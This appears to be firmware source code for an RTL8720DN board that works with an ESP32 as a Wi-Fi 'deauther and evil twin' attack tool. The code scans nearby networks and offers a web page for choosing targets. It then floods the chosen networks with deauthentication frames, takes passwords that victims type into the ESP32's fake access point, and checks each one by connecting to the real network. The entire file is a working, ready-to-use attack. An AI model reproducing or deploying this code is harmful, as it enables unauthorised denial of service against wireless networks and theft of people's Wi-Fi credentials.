/*
This code if for the Master - RTL8720DN. Features:
 - Access point with ability to select targets
 - Scan of 2.4 and 5GHz APs
 - Deauther with periodic channel rescan
 - Wire communication to ESP32:
 -- Pass information about selected target (BSSID, Name)
 -- Ask if user has provided a password to be verified.
 - If password was provided from ESP32:
 -- stop deauth 
 -- attempt to connect to the AP 
 -- if successful, permanently stop deauth and pass OK info to ESP32 so password can be displayed
 -- otherwise pass NOT_OK to ESP32 so it can display failed info and resume deauth

ESP's SDA (21) is connected to RTL PA26
ESP's SCL (22) is connected to RTL PA25

*/

#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include <array>
#include <Wire.h>



typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;


//Access point name and password, feel free to change:
char *ssid = "ROUTER";
char *pass = "eviltwin";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<std::array<uint8_t, 6>> deauth_bssids;

WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

#define FRAMES_PER_DEAUTH 5

String password2Verify = "";
String evilTwinNetworkName = "";
int missionSuccessful = 0;
uint32_t last_scan_time = 0;
int passVerificationInProgress = 0;
#define SCAN_INTERVAL 120000


/////// SCANNING METHODS

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}


////// HOTSPOT Methods

String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
  std::vector<std::pair<String, String>> post_params;

  // Find the start of the body
  int body_start = request.indexOf("\r\n\r\n");
  if (body_start == -1) {
    return post_params;
  }
  body_start += 4;

  // Extract the POST data
  String post_data = request.substring(body_start);

  int start = 0;
  int end = post_data.indexOf('&', start);

  while (end != -1) {
    String key_value_pair = post_data.substring(start, end);
    int delimiter_position = key_value_pair.indexOf('=');

    if (delimiter_position != -1) {
      String key = key_value_pair.substring(0, delimiter_position);
      String value = key_value_pair.substring(delimiter_position + 1);
      post_params.push_back({ key, value });
    }

    start = end + 1;
    end = post_data.indexOf('&', start);
  }

  // Handle the last key-value pair
  String key_value_pair = post_data.substring(start);
  int delimiter_position = key_value_pair.indexOf('=');
  if (delimiter_position != -1) {
    String key = key_value_pair.substring(0, delimiter_position);
    String value = key_value_pair.substring(delimiter_position + 1);
    post_params.push_back({ key, value });
  }

  return post_params;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") + R"(
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>RTL8720DN DEAUTHER & ESP32 EVIL TWIN</title>
      <script>
      function encodeInput() {
          let input = document.querySelector("select[name='evilTwinNetwork']");
          input.value = encodeURIComponent(input.value); // Changes space into %20, instead of +
      }
      </script>
      
      <style>
          body {
              font-family: Arial, sans-serif;
              line-height: 1.6;
              color: #333;
              max-width: 800px;
              margin: 0 auto;
              padding: 20px;
              background-color: #f4f4f4;
          } 
          h1, h2 {
              color: #2c3e50;
          }
          table {
              width: 100%;
              border-collapse: collapse;
              margin-bottom: 20px;
          }
          th, td {
              padding: 12px;
              text-align: left;
              border-bottom: 1px solid #ddd;
          }
          th {
              background-color: #3498db;
              color: white;
          }
          tr:nth-child(even) {
              background-color: #f2f2f2;
          }
          form {
              background-color: white;
              padding: 20px;
              border-radius: 5px;
              box-shadow: 0 2px 5px rgba(0,0,0,0.1);
              margin-bottom: 20px;
          }
          input[type="submit"] {
              padding: 10px 20px;
              border: none;
              background-color: #3498db;
              color: white;
              border-radius: 4px;
              cursor: pointer;
              transition: background-color 0.3s;
          }
          input[type="submit"]:hover {
              background-color: #2980b9;
          }
      </style>
  </head>
  <body>
      <h1>RTL8720DN DEAUTHER & ESP32 EVIL TWIN</h1>

      <h2>Select Access Points to deauth:</h2>
      <form method="post" action="/deauth" onsubmit=\"encodeInput()\">
          <table>
              <tr>
                  <th>Select</th>
                  <th>No</th>
                  <th>SSID</th>
                  <th>BSSID</th>
                  <th>Channel</th>
                  <th>RSSI</th>
                  <th>Freq</th>
              </tr>
  )";

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    response += "<tr>";
    response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
    response += "<td>" + String(i) + "</td>";
    response += "<td>" + scan_results[i].ssid + "</td>";
    response += "<td>" + scan_results[i].bssid_str + "</td>";
    response += "<td>" + String(scan_results[i].channel) + "</td>";
    response += "<td>" + String(scan_results[i].rssi) + "</td>";
    response += "<td>" + (String)((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
    response += "</tr>";
  }

  

  response += "</table><BR>Select one Evil Twin target: <BR>";
  response += "<select name='evilTwinNetwork'>";
  for (uint32_t i = 0; i < scan_results.size(); i++) {
    response += "<option value='" + scan_results[i].ssid + "'>" + scan_results[i].ssid + "</option>";
  }
  response += "</select>";

  response += R"(
          <p>Deauth reason code:</p>
          <input type="text" name="reason" value="2">
          <input type="submit" value="Start Attack">
      </form>
      <form method="post" action="/rescan">
          <input type="submit" value="Scan again">
      </form>
  </body>
  </html>
  )";

  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}


// COMMUNICATION WITH ESP32

void passEvilTwinData2Esp32() {
  if (!evilTwinNetworkName.equals("")) {
    Wire.beginTransmission(8);
    Wire.write("#()^7841%_");
    Wire.write(evilTwinNetworkName.c_str());
    Wire.endTransmission();
    DEBUG_SER_PRINT("Passed evil twin network name to ESP32 :");
    DEBUG_SER_PRINT(evilTwinNetworkName);
    delay(200);
  }
}

void passWrongPassword2Esp32() {
  Wire.beginTransmission(8);
  Wire.write("#()^7842%_BadPass");
  DEBUG_SER_PRINT("Passed BAD PASS to ESP32\n");
  Wire.endTransmission();
  delay(200);
}

void passGoodPassword2Esp32() {
  Wire.beginTransmission(8);
  Wire.write("#()^7843%_GoodPass");
  DEBUG_SER_PRINT("Passed GOOD PASS to ESP32\n");
  Wire.endTransmission();
  delay(200);
}

String prevWirePass = "";

void askEsp32ForPasswordProvidedByUser() {
  String pass = "";

  Wire.requestFrom(8, 100);
  int receivedCount = 0;

  while (Wire.available()) {
    char c = Wire.read();
    if (c == '\n') {
      //DEBUG_SER_PRINT("\nReceived first character is end of line pass string, ignoring");
      break;
    } else {
      //DEBUG_SER_PRINT("\nCharacter is: ");
      //DEBUG_SER_PRINT((int)c);
      pass += c;
      receivedCount++;
    }
  }


  if (receivedCount == 0) {
    //DEBUG_SER_PRINT("\nReceived only end of line pass string, ignoring");
    pass = "";
    password2Verify = pass;
    delay(200);
  } else {
    DEBUG_SER_PRINT("\nReceived correct pass string:");
    DEBUG_SER_PRINT(pass);
    delay(200);
    if (pass.length() > 1) {
      if (pass.equals(prevWirePass)) {
        DEBUG_SER_PRINT("\nGot THE SAME password to verify again, ignoring!");
        password2Verify = "";
      } else {
        prevWirePass = pass;
        password2Verify = pass;
        DEBUG_SER_PRINT("\nGot password to verify:");
        DEBUG_SER_PRINT(pass);
        //delay(100);
      }
    }
  }
  delay(50);
}



//////////// UTILITY METHODS



/**
Verifies AP password. Up to 3 attempts.
*/
int verifyPassword(char ssid[], char pass[]) {
  DEBUG_SER_PRINT("\nStarting procedure of password verification:");
  DEBUG_SER_PRINT(pass);
  DEBUG_SER_PRINT("\n");
  passVerificationInProgress = 1;
  int attemptCount = 0;
  int success = 0;

  while ((attemptCount < 3) && (success == 0)) {
    int status = WL_IDLE_STATUS;
    WiFi.disconnect();
    status = WiFi.begin(ssid, pass);

    uint32_t initialTime = millis();
    uint32_t current_time = millis();
    uint32_t diff = current_time - initialTime;

    while ((status != WL_CONNECTED) && (diff < 500)) {
      current_time = millis();
      diff = current_time - initialTime;
      delay(50);
    }

    DEBUG_SER_PRINT("\n Attempt Count:");
    DEBUG_SER_PRINT(attemptCount);
    DEBUG_SER_PRINT("\n STATUS RESTURNED:");
    DEBUG_SER_PRINT(status);
    DEBUG_SER_PRINT("\n");

    if (status == WL_CONNECTED) {
      success = 1;
    }
    attemptCount++;
  }
  passVerificationInProgress = 0;
  return success;
}

//just a debug method
void printMac(const uint8_t mac[6]) {
  for (u8 i = 0; i < 6; i++) {
    if (i > 0) {
      DEBUG_SER_PRINT(":");
    }
    if (mac[i] < 16) {
      DEBUG_SER_PRINT("0");
    }
    DEBUG_SER_PRINT(mac[i], HEX);
  }
}

/////////// SETUP

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();


  Wire.begin();

  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks()) {
    delay(1000);
  }
  server.begin();

  delay(5000);
}

String urlDecode(String input) {
    String output = "";
    char temp[3] = {'\0', '\0', '\0'};
    
    for (size_t i = 0; i < input.length(); i++) {
        if (input[i] == '%') {
            if (i + 2 < input.length()) {
                temp[0] = input[i + 1];
                temp[1] = input[i + 2];
                char decodedChar = strtol(temp, NULL, 16);
                output += decodedChar;
                i += 2;
            }
        } else if (input[i] == '+') {
            output += ' ';
        } else {
            output += input[i];
        }
    }
    return output;
}

//Main LOOP

void loop() {
  //if missionSuccessful just do nothing - password should be on the screen
  if (!missionSuccessful) {
    //Comunication if !passVerificationInProgress:

    if (passVerificationInProgress == 0) {
      passEvilTwinData2Esp32();
      askEsp32ForPasswordProvidedByUser();
    }

    // DEBUG_SER_PRINT("\nDEBUG password2Verify:");
    // DEBUG_SER_PRINT(password2Verify);

    // DEBUG_SER_PRINT("\nDEBUG evilTwinNetworkName:");
    // DEBUG_SER_PRINT(evilTwinNetworkName);
    // delay(100);

    if (!(password2Verify.equals("") || evilTwinNetworkName.equals(""))) {
      //we have both AP name and password to try:

      int verificationResult = verifyPassword((char *)evilTwinNetworkName.c_str(), (char *)password2Verify.c_str());
      if (verificationResult) {
        //ok, we have good password, let's pass it to ESP32 to stop Evil Twin and present it on the screen:
        passGoodPassword2Esp32();
        missionSuccessful = 1;
      } else {
        //password was invalid, pass it to ESP32 so it can be displayed it on the screen:
        passWrongPassword2Esp32();

        // do not attempt again, one try (3 times) is enough:
        password2Verify = "";
      }
    }

    //let's just continue usual stuff (deauthing and rescanning)

    uint32_t current_time = millis();
    uint32_t diff = current_time - last_scan_time;

    if (diff >= SCAN_INTERVAL) {
      last_scan_time = current_time;
      DEBUG_SER_PRINT("Rescanning...\n");
      //digitalWrite(LED_R, LOW);
      if (deauth_bssids.size()) {
        DEBUG_SER_PRINT("Scanning...");
        if (scanNetworks() == 0) {
          DEBUG_SER_PRINT("Rescanned.\n");
        } else {
          DEBUG_SER_PRINT("Failed to rescan!\n");
        }
      }
    }

    if (deauth_bssids.size() > 0) {

      current_time = millis();
      diff = current_time - last_scan_time;

      for (const auto &bssid : deauth_bssids) {
        memcpy(deauth_bssid, bssid.data(), 6);
        int netFound = 0;
        for (const auto &result : scan_results) {
          if (memcmp(result.bssid, bssid.data(), 6) == 0) {
            DEBUG_SER_PRINT("\nDeauth channel:");
            DEBUG_SER_PRINT(result.channel);
            DEBUG_SER_PRINT("\n");
            wext_set_channel(WLAN0_NAME, result.channel);
            netFound = 1;
            break;
          }
        }
        if (netFound) {
          DEBUG_SER_PRINT("\nDeauth_bssid to be attacked: ");
          for (int i = 0; i < 6; i++) {
            if (i > 0) {
              DEBUG_SER_PRINT(":");
            }
            if (deauth_bssid[i] < 16) {
              DEBUG_SER_PRINT("0");
            }
            DEBUG_SER_PRINT(deauth_bssid[i], HEX);
          }
          DEBUG_SER_PRINT("\n");
          for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
          }
        }
      }
    } else {
      //Target not selected yet - offer Web UI:
      WiFiClient client = server.available();
      if (client.connected()) {
        String request;
        while (client.available()) {
          while (client.available()) request += (char)client.read();
          delay(1);
        }
        DEBUG_SER_PRINT(request);
        String path = parseRequest(request);
        DEBUG_SER_PRINT("\nRequested path: " + path + "\n");

        if (path == "/") {
          handleRoot(client);
        } else if (path == "/rescan") {
          client.write(makeRedirect("/").c_str());
          while (scanNetworks()) {
            delay(1000);
          }
        } else if (path == "/deauth") {
          std::vector<std::pair<String, String>> post_data = parsePost(request);
          if (post_data.size() >= 2) {
            for (auto &param : post_data) {
              if (param.first == "network") {
                int network_index = String(param.second).toInt();
                DEBUG_SER_PRINT("\nSelected Network: " + (String)network_index + "\n");
                deauth_bssids.push_back(std::array<uint8_t, 6>{
                  scan_results[network_index].bssid[0],
                  scan_results[network_index].bssid[1],
                  scan_results[network_index].bssid[2],
                  scan_results[network_index].bssid[3],
                  scan_results[network_index].bssid[4],
                  scan_results[network_index].bssid[5] });
              } else if (param.first == "reason") {
                deauth_reason = String(param.second).toInt();
              } else if (param.first == "evilTwinNetwork") {
                
                evilTwinNetworkName = String(urlDecode(param.second));
                DEBUG_SER_PRINT("\nEvilTwinNetworkName: " + evilTwinNetworkName + "\n");
              }
            }
          }
        } else {
          handle404(client);
        }
        client.stop();
      }
    }
    delay(50);
  }
}
